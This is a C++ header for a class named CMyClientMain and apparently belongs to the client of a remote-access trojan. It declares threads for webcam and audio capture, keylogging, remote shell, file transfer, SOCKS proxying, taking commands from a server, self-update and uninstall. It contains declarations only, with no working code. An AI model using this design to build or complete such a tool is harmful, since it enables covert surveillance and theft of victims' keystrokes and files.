// MyClientMain.h: interface for the CMyClientMain class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MYCLIENTMAIN_H__518EAB1C_77DF_4990_B750_72AACD29A6FE__INCLUDED_)
#define AFX_MYCLIENTMAIN_H__518EAB1C_77DF_4990_B750_72AACD29A6FE__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

void WINAPI DoFrameWork();
DWORD static SSH_LinkThread(LPVOID lPvoid);
DWORD static SSH_MessThread(LPVOID lPvoid);
BOOL static StartUserProcess(DWORD nCmd, HWND hWnd);

class CMyClientMain  : public CMyClientTran
{
public:
	CMyClientMain();
	virtual ~CMyClientMain();
	
	BOOL m_IsExitWork;

	void DoWork();
	void DoRundll32Work(char* sCmdLines);
	DWORD static SSH_InDvThread(LPVOID lPvoid);
	DWORD static SSH_TlntThread(LPVOID lPvoid);
	DWORD static SSH_MainThread(LPVOID lPvoid);
	DWORD static SSH_FramThread(LPVOID lPvoid);
	DWORD static SSH_VideoThread(LPVOID lPvoid);
	DWORD static SSH_AudioThread(LPVOID lPvoid);
	DWORD static SSH_TuRlThread(LPVOID lPvoid);
	DWORD static SSH_DlThread(LPVOID lPvoid);
	DWORD static SSH_UpThread(LPVOID lPvoid);
	DWORD static SSH_FileThread(LPVOID lPvoid);
	DWORD static SSH_KeyMThread(LPVOID lPvoid);
	DWORD static SSH_CwndThread(LPVOID lPvoid);
	DWORD static SSH_StartSocksThread(LPVOID lPvoid);
	DWORD static SSH_StopSocksThread(LPVOID lPvoid);
	DWORD static SSH_UpdateWaitThread(LPVOID lPvoid);
	DWORD static SSH_StartKeyThread(LPVOID lPvoid);

private:
	
	BOOL GetCmdFromServer();
	void ShutDownSystem(BOOL Flag);
	BOOL UpdateFile();
	void UninstallFile();
	void StopKey();
};

#endif // !defined(AFX_MYCLIENTMAIN_H__518EAB1C_77DF_4990_B750_72AACD29A6FE__INCLUDED_)
